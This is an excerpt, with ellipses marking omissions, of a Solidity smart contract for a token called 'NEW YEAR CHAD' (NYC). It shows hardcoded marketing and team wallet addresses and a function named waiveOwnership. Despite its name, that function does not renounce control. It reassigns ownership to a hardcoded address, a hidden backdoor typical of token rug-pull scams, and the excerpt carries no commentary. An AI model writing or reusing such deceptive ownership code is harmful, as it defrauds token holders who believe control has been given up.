...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xE5a0580b3763d1E458C5C26130a5d84Bc722778C);
    }
...
contract NEWYEARCHAD is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NEW YEAR CHAD";
    string private _symbol = "NYC";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x0b89fb1dd3acBA9F18a77429dE714e102d88aCAa);
    address payable private teamWalletAddress = payable(0xDF2f9812414b8Fba153B2f4eC9D84B7aFA2A3dfF);
